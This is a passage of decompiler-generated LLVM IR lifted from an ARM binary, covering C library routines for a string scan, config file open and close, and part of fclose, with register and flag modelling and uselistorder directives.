  %v1_15140 = add i32 %v0_15140, 1
  store i32 %v1_15140, i32* @r6, align 4
  %v1_15144 = inttoptr i32 %v0_15144 to i8*
  %v2_15144 = load i8, i8* %v1_15144, align 1
  %v3_15144 = zext i8 %v2_15144 to i32
  store i32 %v3_15144, i32* %r2.global-to-local, align 4
  %v2_15148 = icmp eq i8 %v2_15144, 0
  store i1 %v2_15148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15148, label %dec_label_pc_15160, label %dec_label_pc_15150

dec_label_pc_15150:                               ; preds = %dec_label_pc_1506c, %dec_label_pc_15140
  %v0_1509c = phi i32 [ %v0_15144, %dec_label_pc_15140 ], [ %v0_1514412, %dec_label_pc_1506c ]
  %v2_1509c = phi i32 [ %v1_15140, %dec_label_pc_15140 ], [ %v0_15084, %dec_label_pc_1506c ]
  %v1_15154 = phi i32 [ %v3_15144, %dec_label_pc_15140 ], [ %v3_1514415, %dec_label_pc_1506c ]
  %v0_15150 = load i32, i32* @r7, align 4
  %v1_15150 = inttoptr i32 %v0_15150 to i8*
  %v2_15150 = load i8, i8* %v1_15150, align 1
  %v3_15150 = zext i8 %v2_15150 to i32
  store i32 %v3_15150, i32* %r3.global-to-local, align 4
  %v9_15154 = icmp eq i32 %v3_15150, %v1_15154
  store i1 %v9_15154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15154, label %dec_label_pc_15160, label %bb72

bb72:                                             ; preds = %dec_label_pc_15150
  %v2_15158 = load i32, i32* @sb, align 4
  %v3_15158 = sub i32 %v2_1509c, %v2_15158
  %v5_15158 = xor i32 %v2_15158, %v2_1509c
  %v6_15158 = xor i32 %v3_15158, %v2_1509c
  %v7_15158 = and i32 %v6_15158, %v5_15158
  %v8_15158 = icmp slt i32 %v7_15158, 0
  %v9_15158 = icmp slt i32 %v3_15158, 0
  %v10_15158 = icmp eq i32 %v2_1509c, %v2_15158
  store i1 %v10_15158, i1* %cpsr_z.global-to-local, align 1
  %v2_1515c = xor i1 %v9_15158, %v8_15158
  br i1 %v2_1515c, label %dec_label_pc_1508c, label %dec_label_pc_15160

dec_label_pc_15160:                               ; preds = %dec_label_pc_15150, %dec_label_pc_15140, %bb72, %dec_label_pc_1506c
  %v0_15164 = phi i32 [ %v0_15084, %dec_label_pc_1506c ], [ %v2_1509c, %dec_label_pc_15150 ], [ %v1_15140, %dec_label_pc_15140 ], [ %v2_1509c, %bb72 ]
  store i32 %v3_14e84, i32* %r2.global-to-local, align 4
  %v9_15164 = icmp eq i32 %v0_15164, %v3_14e84
  store i1 %v9_15164, i1* %cpsr_z.global-to-local, align 1
  %v6_15168 = icmp slt i32 %v0_15164, %v3_14e84
  br i1 %v6_15168, label %dec_label_pc_1516c, label %dec_label_pc_15178

dec_label_pc_1516c:                               ; preds = %dec_label_pc_15160
  %v0_1516c = load i32, i32* @r8, align 4
  %v1_1516c = and i32 %v0_1516c, 1048576
  %v2_1516c = icmp eq i32 %v1_1516c, 0
  store i1 %v2_1516c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1516c, label %dec_label_pc_14ec4.backedge, label %dec_label_pc_15174

dec_label_pc_15174:                               ; preds = %dec_label_pc_1516c, %dec_label_pc_1502c, %.thread, %entry
  br label %dec_label_pc_15178

dec_label_pc_15178:                               ; preds = %dec_label_pc_15160, %dec_label_pc_14f48, %dec_label_pc_15174
  %v0_15178 = phi i32 [ %v0_14f58, %dec_label_pc_14f48 ], [ 0, %dec_label_pc_15174 ], [ %v0_15164, %dec_label_pc_15160 ]
  store i32 %v0_15178, i32* %r0.global-to-local, align 4
  store i32 %v3_14e60, i32* @r4, align 4
  store i32 %v6_14e60, i32* @r5, align 4
  store i32 %v9_14e60, i32* @r6, align 4
  store i32 %v12_14e60, i32* @r7, align 4
  store i32 %v15_14e60, i32* @r8, align 4
  store i32 %v18_14e60, i32* @sb, align 4
  store i32 %v21_14e60, i32* @sl, align 4
  store i32 %v24_14e60, i32* @fp, align 4
  ret i32 %v0_15178

; uselistorder directives
  uselistorder i32 %v0_15178, { 1, 0 }
  uselistorder i32 %v0_15164, { 0, 2, 1 }
  uselistorder i32 %v3_15158, { 1, 0 }
  uselistorder i32 %v2_15158, { 1, 0, 2 }
  uselistorder i32 %v2_1509c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15144.pre, { 0, 2, 1 }
  uselistorder i32 %v5_150d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15084, { 1, 0, 2 }
  uselistorder i1 %v9_15064, { 1, 0 }
  uselistorder i32 %v3_1503c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1502c, { 1, 0 }
  uselistorder i1 %v8_15024, { 1, 0 }
  uselistorder i32 %v3_14ff4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_14fe4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_14fcc, { 1, 0, 2 }
  uselistorder i32 %v1_14fbc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14fa8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14fa0, { 1, 0 }
  uselistorder i32 %v1_14f8c, { 1, 0 }
  uselistorder i32 %v1_14f88, { 1, 0 }
  uselistorder i32 %v2_14f64, { 1, 0 }
  uselistorder i32 %v1_14f48, { 2, 0, 1 }
  uselistorder i32 %v0_14f30, { 1, 0 }
  uselistorder i32 %v1_14f20, { 0, 2, 1 }
  uselistorder i32* %v1_15090, { 1, 0 }
  uselistorder i1 %v2_15038, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14eac, { 2, 0, 1, 3 }
  uselistorder i32 %v1_14ea0, { 2, 1, 0 }
  uselistorder i32 %v3_14e88, { 1, 2, 0 }
  uselistorder i32 %v3_14e84, { 2, 1, 0 }
  uselistorder i32 %v1_14e7c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 2, 3, 1, 5, 0, 4, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15178, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15160, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15150, { 1, 0 }
  uselistorder label %dec_label_pc_15140, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_150f4, { 1, 0 }
  uselistorder label %dec_label_pc_14ec4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15054, { 1, 0 }
  uselistorder label %dec_label_pc_1502c, { 1, 0 }
  uselistorder label %dec_label_pc_15020, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14fe4, { 1, 0 }
  uselistorder label %dec_label_pc_14f18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1518c = icmp eq i32* %arg1, null
  br i1 %v2_1518c, label %dec_label_pc_151b4, label %dec_label_pc_15194

dec_label_pc_15194:                               ; preds = %entry
  %v2_15194 = load i32, i32* %arg1, align 4
  %v1_15198 = inttoptr i32 %v2_15194 to i16*
  %v2_15198 = call i32 @__GI_fclose(i16* %v1_15198)
  %v0_1519c = load i32, i32* @r4, align 4
  %v1_1519c = add i32 %v0_1519c, 20
  %v2_1519c = inttoptr i32 %v1_1519c to i32*
  %v3_1519c = load i32, i32* %v2_1519c, align 4
  %v2_151a0 = icmp eq i32 %v3_1519c, 0
  br i1 %v2_151a0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15194
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15194, %bb
  store i32 86444, i32* @lr, align 4
  %v1_151a8 = xor i1 %v2_151a0, true
  call void @__pseudo_cond_branch(i1 %v1_151a8, i32 ptrtoint (i32* @global_var_12874.33 to i32))
  %v0_151ac = load i32, i32* @r4, align 4
  store i32 %v0_151ac, i32* @r0, align 4
  %v0_151b0 = call i32 @free()
  br label %dec_label_pc_151b4

dec_label_pc_151b4:                               ; preds = %entry, %bb6
  %v1_151b8 = phi i32 [ 0, %entry ], [ %v0_151b0, %bb6 ]
  ret i32 %v1_151b8

; uselistorder directives
  uselistorder label %dec_label_pc_151b4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_151c8 = load i32, i32* @r4, align 4
  store i32 %v3_151c8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -33972), i32* @r1, align 4
  %v0_151d0 = call i32 @__GI_fopen()
  store i32 %v0_151d0, i32* %r0.global-to-local, align 4
  store i32 %v0_151d0, i32* @r4, align 4
  %v2_151d4 = icmp eq i32 %v0_151d0, 0
  br i1 %v2_151d4, label %bb, label %dec_label_pc_151e0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_151e0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_151e8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_151e8, i32* %r0.global-to-local, align 4
  %v2_151ec = icmp eq i32 %v2_151e8, 0
  br i1 %v2_151ec, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_151e0
  %v1_151f0 = load i32, i32* @r4, align 4
  %v3_151f0 = inttoptr i32 %v2_151e8 to i32*
  store i32 %v1_151f0, i32* %v3_151f0, align 4
  %v1_151f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_151e0, %bb4
  %v1_151f8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_151e0 ], [ %v1_151f8.pre, %bb4 ]
  %v2_151f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_151f4, i32* @r4, align 4
  ret i32 %v1_151f8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 40, 38, 39, 37, 36, 35, 34, 33, 32, 1, 0, 31, 30, 29, 28, 27, 26, 2, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15204 = load i32, i32* @r4, align 4
  store i32 %v3_15204, i32* %stack_var_-36, align 4
  %v6_15204 = load i32, i32* @r5, align 4
  %v9_15204 = load i32, i32* @r6, align 4
  %v12_15204 = load i32, i32* @r7, align 4
  %v2_15208 = add i32 %tmp, 52
  %v3_15208 = inttoptr i32 %v2_15208 to i32*
  %v4_15208 = load i32, i32* %v3_15208, align 4
  store i32 %v4_15208, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15210 = icmp eq i32 %v4_15208, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r8, align 4
  br i1 %v2_15210, label %dec_label_pc_15224, label %dec_label_pc_15288

dec_label_pc_15224:                               ; preds = %entry
  %v0_15224 = call i32 @__aeabi_read_tp()
  store i32 %v0_15224, i32* %r0.global-to-local, align 4
  %v0_15228 = load i32, i32* @r5, align 4
  %v1_15228 = add i32 %v0_15228, 64
  %v2_15228 = inttoptr i32 %v1_15228 to i32*
  %v3_15228 = load i32, i32* %v2_15228, align 4
  store i32 %v3_15228, i32* %r3.global-to-local, align 4
  %v1_1522c = add i32 %v0_15224, -1168
  store i32 %v1_1522c, i32* @r6, align 4
  %v3_15230 = icmp uge i32 %v3_15228, %v1_1522c
  store i1 %v3_15230, i1* %cpsr_c.global-to-local, align 1
  %v9_15230 = icmp eq i32 %v3_15228, %v1_1522c
  br i1 %v9_15230, label %dec_label_pc_1527c, label %dec_label_pc_15238

dec_label_pc_15238:                               ; preds = %dec_label_pc_15224
  %v1_15238 = add i32 %v0_15228, 56
  store i32 %v1_15238, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15238, i32* %r2.global-to-local, align 4
  %v0_15244 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15244, i32* @r4, align 4
  %v1_15248115 = inttoptr i32 %v1_15238 to i32*
  %v2_15248116 = load i32, i32* %v1_15248115, align 4
  store i32 %v2_15248116, i32* %r3.global-to-local, align 4
  %v3_1524c118 = icmp uge i32 %v2_15248116, %v0_15244
  store i1 %v3_1524c118, i1* %cpsr_c.global-to-local, align 1
  %v9_1524c124 = icmp eq i32 %v2_15248116, %v0_15244
  br i1 %v9_1524c124, label %dec_label_pc_15254, label %dec_label_pc_1526c

dec_label_pc_15254:                               ; preds = %dec_label_pc_15238, %dec_label_pc_15254.dec_label_pc_15248_crit_edge
  %v0_15254125 = phi i32 [ %v1_1524c.pre, %dec_label_pc_15254.dec_label_pc_15248_crit_edge ], [ %v0_15244, %dec_label_pc_15238 ]
  store i32 %v0_15254125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15264 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15264, label %dec_label_pc_15268, label %dec_label_pc_15254.dec_label_pc_15248_crit_edge

dec_label_pc_15254.dec_label_pc_15248_crit_edge:  ; preds = %dec_label_pc_15254
  %v0_15248.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1524c.pre = load i32, i32* @r4, align 4
  %v1_15248 = inttoptr i32 %v0_15248.pre to i32*
  %v2_15248 = load i32, i32* %v1_15248, align 4
  store i32 %v2_15248, i32* %r3.global-to-local, align 4
  %v3_1524c = icmp uge i32 %v2_15248, %v1_1524c.pre
  store i1 %v3_1524c, i1* %cpsr_c.global-to-local, align 1
  %v9_1524c = icmp eq i32 %v2_15248, %v1_1524c.pre
  br i1 %v9_1524c, label %dec_label_pc_15254, label %dec_label_pc_1526c

dec_label_pc_15268:                               ; preds = %dec_label_pc_15254
  %v0_15268 = load i32, i32* @r4, align 4
  store i32 %v0_15268, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %dec_label_pc_15238, %dec_label_pc_15254.dec_label_pc_15248_crit_edge, %dec_label_pc_15268
  %v0_1526c = phi i32 [ %v0_15268, %dec_label_pc_15268 ], [ %v2_15248116, %dec_label_pc_15238 ], [ %v2_15248, %dec_label_pc_15254.dec_label_pc_15248_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1526c = icmp eq i32 %v0_1526c, 0
  br i1 %v2_1526c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1526c
  %v1_15270 = load i32, i32* @r7, align 4
  store i32 %v1_15270, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1526c, %bb
  %v1_15274 = xor i1 %v2_1526c, true
  call void @__pseudo_cond_branch(i1 %v1_15274, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_15278 = load i32, i32* @r6, align 4
  %v1_15278 = load i32, i32* @r5, align 4
  %v2_15278 = add i32 %v1_15278, 64
  %v3_15278 = inttoptr i32 %v2_15278 to i32*
  store i32 %v0_15278, i32* %v3_15278, align 4
  %v0_1527c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1527c

dec_label_pc_1527c:                               ; preds = %dec_label_pc_15224, %bb41
  %v0_1527c = phi i32 [ %v0_15228, %dec_label_pc_15224 ], [ %v0_1527c.pre, %bb41 ]
  %v1_1527c = add i32 %v0_1527c, 60
  %v2_1527c = inttoptr i32 %v1_1527c to i32*
  %v3_1527c = load i32, i32* %v2_1527c, align 4
  %v1_15280 = add i32 %v3_1527c, 1
  store i32 %v1_15280, i32* %r3.global-to-local, align 4
  store i32 %v1_15280, i32* %v2_1527c, align 4
  %v0_15288.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15288

dec_label_pc_15288:                               ; preds = %entry, %dec_label_pc_1527c
  %v1_15290 = phi i32 [ %tmp, %entry ], [ %v0_15288.pre, %dec_label_pc_1527c ]
  %v1_15288 = inttoptr i32 %v1_15290 to i16*
  %v2_15288 = load i16, i16* %v1_15288, align 2
  %v3_15288 = zext i16 %v2_15288 to i32
  store i32 %v3_15288, i32* %r3.global-to-local, align 4
  %v1_1528c = and i32 %v3_15288, 64
  %v2_1528c = icmp eq i32 %v1_1528c, 0
  br i1 %v2_1528c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15288
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15288, %bb42
  %storemerge = phi i32 [ %v1_15290, %bb42 ], [ %v1_1528c, %dec_label_pc_15288 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 86680, i32* @lr, align 4
  %v1_15294 = xor i1 %v2_1528c, true
  call void @__pseudo_cond_branch(i1 %v1_15294, i32 ptrtoint (i32* @global_var_160d8.588 to i32))
  %v0_15298 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15298, i32* %fp.global-to-local, align 4
  %v0_1529c = load i32, i32* @r5, align 4
  %v1_1529c = add i32 %v0_1529c, 4
  %v2_1529c = inttoptr i32 %v1_1529c to i32*
  %v3_1529c = load i32, i32* %v2_1529c, align 4
  store i32 %v3_1529c, i32* %r0.global-to-local, align 4
  %v1_152a0 = call i32 @__GI___libc_close(i32 %v3_1529c)
  store i32 %v1_152a0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_152a8 = load i32, i32* @r8, align 4
  %v2_152a8 = add i32 %v0_152a8, 160
  %v3_152a8 = inttoptr i32 %v2_152a8 to i32*
  %v4_152a8 = load i32, i32* %v3_152a8, align 4
  store i32 %v4_152a8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_152ac = icmp slt i32 %v1_152a0, 0
  br i1 %v1_152ac, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_152b4 = add i32 %v4_152a8, 8
  %v2_152b4 = inttoptr i32 %v1_152b4 to i32*
  %v3_152b4 = load i32, i32* %v2_152b4, align 4
  store i32 %v3_152b4, i32* %r3.global-to-local, align 4
  %v0_152b8 = call i32 @__aeabi_read_tp()
  store i32 %v0_152b8, i32* %r0.global-to-local, align 4
  %v1_152bc = add i32 %v0_152b8, -1168
  store i32 %v1_152bc, i32* %sl.global-to-local, align 4
  %v0_152c0 = load i32, i32* %r3.global-to-local, align 4
  %v3_152c0 = icmp uge i32 %v0_152c0, %v1_152bc
  store i1 %v3_152c0, i1* %cpsr_c.global-to-local, align 1
  %v9_152c0 = icmp eq i32 %v0_152c0, %v1_152bc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_152c8 = load i32, i32* @r5, align 4
  %v2_152c8 = add i32 %v1_152c8, 4
  %v3_152c8 = inttoptr i32 %v2_152c8 to i32*
  store i32 -1, i32* %v3_152c8, align 4
  br i1 %v9_152c0, label %dec_label_pc_15310, label %dec_label_pc_152d0

dec_label_pc_152d0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_152d4 = load i32, i32* @r7, align 4
  store i32 %v0_152d4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_152dc108 = inttoptr i32 %v0_152d4 to i32*
  %v2_152dc109 = load i32, i32* %v1_152dc108, align 4
  store i32 %v2_152dc109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_152e0111 = icmp eq i32 %v2_152dc109, 0
  br i1 %v9_152e0111, label %dec_label_pc_152e8, label %dec_label_pc_15300

dec_label_pc_152e8:                               ; preds = %dec_label_pc_152d0, %dec_label_pc_152e8.dec_label_pc_152dc_crit_edge
  %v0_152e8112 = phi i32 [ %v1_152e0.pre, %dec_label_pc_152e8.dec_label_pc_152dc_crit_edge ], [ 0, %dec_label_pc_152d0 ]
  store i32 %v0_152e8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_152f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_152f8, label %dec_label_pc_152fc, label %dec_label_pc_152e8.dec_label_pc_152dc_crit_edge

dec_label_pc_152e8.dec_label_pc_152dc_crit_edge:  ; preds = %dec_label_pc_152e8
  %v0_152dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_152e0.pre = load i32, i32* @r4, align 4
  %v1_152dc = inttoptr i32 %v0_152dc.pre to i32*
  %v2_152dc = load i32, i32* %v1_152dc, align 4
  store i32 %v2_152dc, i32* %r3.global-to-local, align 4
  %v3_152e0 = icmp uge i32 %v2_152dc, %v1_152e0.pre
  store i1 %v3_152e0, i1* %cpsr_c.global-to-local, align 1
  %v9_152e0 = icmp eq i32 %v2_152dc, %v1_152e0.pre
  br i1 %v9_152e0, label %dec_label_pc_152e8, label %dec_label_pc_15300

dec_label_pc_152fc:                               ; preds = %dec_label_pc_152e8
  %v0_152fc = load i32, i32* @r4, align 4
  store i32 %v0_152fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %dec_label_pc_152d0, %dec_label_pc_152e8.dec_label_pc_152dc_crit_edge, %dec_label_pc_152fc
  %v0_15300 = phi i32 [ %v0_152fc, %dec_label_pc_152fc ], [ %v2_152dc109, %dec_label_pc_152d0 ], [ %v2_152dc, %dec_label_pc_152e8.dec_label_pc_152dc_crit_edge ]
  %v1_15300 = phi i32 [ %v0_152fc, %dec_label_pc_152fc ], [ 0, %dec_label_pc_152d0 ], [ %v1_152e0.pre, %dec_label_pc_152e8.dec_label_pc_152dc_crit_edge ]
  %v3_15300 = icmp uge i32 %v0_15300, %v1_15300
  store i1 %v3_15300, i1* %cpsr_c.global-to-local, align 1
  %v9_15300 = icmp eq i32 %v0_15300, %v1_15300
  br i1 %v9_15300, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_15300
  %v1_15304 = load i32, i32* @r7, align 4
  store i32 %v1_15304, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_15300, %bb46
  %v1_15308 = xor i1 %v9_15300, true
  call void @__pseudo_cond_branch(i1 %v1_15308, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_1530c = load i32, i32* %sl.global-to-local, align 4
  %v1_1530c = load i32, i32* @r7, align 4
  %v2_1530c = add i32 %v1_1530c, 8
  %v3_1530c = inttoptr i32 %v2_1530c to i32*
  store i32 %v0_1530c, i32* %v3_1530c, align 4
  br label %dec_label_pc_15310

dec_label_pc_15310:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15314 = load i32, i32* @r8, align 4
  %v2_15314 = add i32 %v0_15314, 160
  %v3_15314 = inttoptr i32 %v2_15314 to i32*
  %v4_15314 = load i32, i32* %v3_15314, align 4
  store i32 %v4_15314, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1531c = add i32 %v0_15314, 12
  %v3_1531c = inttoptr i32 %v2_1531c to i32*
  %v4_1531c = load i32, i32* %v3_1531c, align 4
  store i32 %v4_1531c, i32* %r2.global-to-local, align 4
  %v1_15320 = add i32 %v4_15314, 4
  %v2_15320 = inttoptr i32 %v1_15320 to i32*
  %v3_15320 = load i32, i32* %v2_15320, align 4
  store i32 %v3_15320, i32* %r1.global-to-local, align 4
  %v1_15324 = inttoptr i32 %v4_1531c to i32*
  %v2_15324 = load i32, i32* %v1_15324, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15328 = icmp eq i32 %v3_15320, 0
  %v1_1532c = add i32 %v2_15324, 1
  store i32 %v1_1532c, i32* %r3.global-to-local, align 4
  store i32 %v1_1532c, i32* %v1_15324, align 4
  br i1 %v2_15328, label %dec_label_pc_15338, label %dec_label_pc_15398

dec_label_pc_15338:                               ; preds = %dec_label_pc_15310
  %v0_15338 = load i32, i32* %r1.global-to-local, align 4
  %v1_15338 = load i32, i32* %r0.global-to-local, align 4
  %v2_15338 = add i32 %v1_15338, 8
  %v3_15338 = inttoptr i32 %v2_15338 to i32*
  store i32 %v0_15338, i32* %v3_15338, align 4
  %v0_1533c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1533c, i32* @r7, align 4
  br label %dec_label_pc_15340

dec_label_pc_15340:                               ; preds = %dec_label_pc_15370.dec_label_pc_15340_crit_edge, %dec_label_pc_15338
  %v0_15340 = phi i32 [ %v0_15340.pre, %dec_label_pc_15370.dec_label_pc_15340_crit_edge ], [ %v0_1533c, %dec_label_pc_15338 ]
  %v1_15340 = inttoptr i32 %v0_15340 to i32*
  %v2_15340 = load i32, i32* %v1_15340, align 4
  store i32 %v2_15340, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15340, i32* %r2.global-to-local, align 4
  %v2_1534c96 = load i32, i32* %v1_15340, align 4
  store i32 %v2_1534c96, i32* %r3.global-to-local, align 4
  %v3_1535098 = icmp uge i32 %v2_1534c96, %v2_15340
  store i1 %v3_1535098, i1* %cpsr_c.global-to-local, align 1
  %v9_15350104 = icmp eq i32 %v2_1534c96, %v2_15340
  br i1 %v9_15350104, label %dec_label_pc_15358, label %dec_label_pc_15370

dec_label_pc_15358:                               ; preds = %dec_label_pc_15340, %dec_label_pc_15358.dec_label_pc_1534c_crit_edge
  %v0_15358105 = phi i32 [ %v1_15350.pre, %dec_label_pc_15358.dec_label_pc_1534c_crit_edge ], [ %v2_15340, %dec_label_pc_15340 ]
  store i32 %v0_15358105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15368 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15368, label %dec_label_pc_1536c, label %dec_label_pc_15358.dec_label_pc_1534c_crit_edge

dec_label_pc_15358.dec_label_pc_1534c_crit_edge:  ; preds = %dec_label_pc_15358
  %v0_1534c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15350.pre = load i32, i32* @r4, align 4
  %v1_1534c = inttoptr i32 %v0_1534c.pre to i32*
  %v2_1534c = load i32, i32* %v1_1534c, align 4
  store i32 %v2_1534c, i32* %r3.global-to-local, align 4
  %v3_15350 = icmp uge i32 %v2_1534c, %v1_15350.pre
  store i1 %v3_15350, i1* %cpsr_c.global-to-local, align 1
  %v9_15350 = icmp eq i32 %v2_1534c, %v1_15350.pre
  br i1 %v9_15350, label %dec_label_pc_15358, label %dec_label_pc_15370

dec_label_pc_1536c:                               ; preds = %dec_label_pc_15358
  %v0_1536c = load i32, i32* @r4, align 4
  store i32 %v0_1536c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15370

dec_label_pc_15370:                               ; preds = %dec_label_pc_15340, %dec_label_pc_15358.dec_label_pc_1534c_crit_edge, %dec_label_pc_1536c
  %v0_15378 = phi i32 [ %v0_1536c, %dec_label_pc_1536c ], [ %v2_1534c96, %dec_label_pc_15340 ], [ %v2_1534c, %dec_label_pc_15358.dec_label_pc_1534c_crit_edge ]
  %v1_15370 = phi i32 [ %v0_1536c, %dec_label_pc_1536c ], [ %v2_15340, %dec_label_pc_15340 ], [ %v1_15350.pre, %dec_label_pc_15358.dec_label_pc_1534c_crit_edge ]
  %v3_15370 = icmp uge i32 %v0_15378, %v1_15370
  store i1 %v3_15370, i1* %cpsr_c.global-to-local, align 1
  %v9_15370 = icmp eq i32 %v0_15378, %v1_15370
  br i1 %v9_15370, label %dec_label_pc_15378, label %dec_label_pc_15370.dec_label_pc_15340_crit_edge

dec_label_pc_15370.dec_label_pc_15340_crit_edge:  ; preds = %dec_label_pc_15370
  %v0_15340.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15340

dec_label_pc_15378:                               ; preds = %dec_label_pc_15370
  %v2_15378 = icmp ne i32 %v1_15370, 0
